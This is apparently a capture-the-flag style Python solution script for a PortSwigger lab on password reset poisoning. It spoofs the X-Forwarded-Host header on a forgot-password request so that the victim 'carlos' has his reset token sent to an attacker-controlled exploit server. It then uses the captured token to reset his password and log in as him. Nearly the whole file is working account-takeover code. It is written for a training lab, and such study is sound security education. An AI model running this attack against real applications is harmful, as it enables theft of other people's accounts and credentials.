# Lab 11 — Password reset poisoning via middleware
# PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
#
# Vulnerability: The password reset link is built using the X-Forwarded-Host
#                header, which front-end middleware trusts over the real Host
#                header — letting an attacker redirect the reset link to their
#                own server
# Aim:           Poison carlos's password reset link so his token lands in our
#                exploit server's access log, then take over his account
#
# Technique:
#   Stage 1: POST /forgot-password  username=carlos  X-Forwarded-Host: exploit-server
#            → carlos receives an email with a reset link pointing at OUR server
#            → he clicks it → our server's access log captures his token
#   Stage 2: use that captured token against the REAL target to set his password
#
#   Stage 1's trigger (carlos clicking the link) cannot be automated — it
#   requires the exploit server and the lab's simulated victim. Run this
#   script once to poison the request, then again with the captured token
#   once you have it from the exploit server's access log.
#
# Usage:
#   Stage 1:  python authentication_lab11.py <url> --poison <exploit_server_domain>
#   Stage 2:  python authentication_lab11.py <url> --token <captured_token>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   login, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NEW_PASSWORD = "hacked123"


def stage1_poison(session, url, exploit_domain):
    section("Stage 1: Poison carlos's password reset link")

    fp_page = session.get(f"{url}/forgot-password")
    csrf = get_csrf_from_response(fp_page.text)

    data = {"username": "carlos"}
    if csrf:
        data["csrf"] = csrf

    r = session.post(
        f"{url}/forgot-password",
        data=data,
        headers={"X-Forwarded-Host": exploit_domain},
        allow_redirects=True
    )
    check_status(r, 200, "POST /forgot-password with poisoned X-Forwarded-Host")

    print()
    print("  ➜  If poisoning worked, carlos's reset email now contains a link to:")
    print(f"     https://{exploit_domain}/forgot-password?temp-forgot-password-token=...")
    print()
    print("  ➜  Next steps:")
    print("     1. Wait for carlos (simulated victim) to click the poisoned link")
    print("     2. Check the exploit server's access log for the incoming request")
    print("     3. Copy the 'temp-forgot-password-token' value")
    print(f"     4. Run: python authentication_lab11.py {url} --token <captured_token>")


def stage2_complete(session, url, token):
    section("Stage 2: Use the captured token to take over carlos's account")

    reset_page = session.get(f"{url}/forgot-password", params={"temp-forgot-password-token": token})
    check_status(reset_page, 200, "Load password reset page with captured token")
    reset_csrf = get_csrf_from_response(reset_page.text)

    reset_data = {
        "temp-forgot-password-token": token,
        "username": "carlos",
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD,
    }
    if reset_csrf:
        reset_data["csrf"] = reset_csrf

    r = session.post(f"{url}/forgot-password", data=reset_data, allow_redirects=True)
    check_status(r, 200, "POST new password for carlos")

    print("\n  ── Logging in as carlos with the new password\n")
    new_session = make_session(proxies)
    if login(new_session, url, username="carlos", password=NEW_PASSWORD):
        print_box("SUCCESS", f"carlos's password reset to: {NEW_PASSWORD}")
    else:
        print("  ✘  Login failed — check the token is still valid and unused")


if __name__ == "__main__":
    banner()
    section("LAB 11 — PASSWORD RESET POISONING VIA MIDDLEWARE (X-Forwarded-Host)")

    if len(sys.argv) != 4 or sys.argv[2] not in ("--poison", "--token"):
        print("  Usage:")
        print("    Stage 1:  python authentication_lab11.py <url> --poison <exploit_server_domain>")
        print("    Stage 2:  python authentication_lab11.py <url> --token <captured_token>")
        sys.exit(1)

    url = sys.argv[1]
    mode = sys.argv[2]
    value = sys.argv[3]
    session = make_session(proxies)

    if mode == "--poison":
        stage1_poison(session, url, value)
    else:
        stage2_complete(session, url, value)
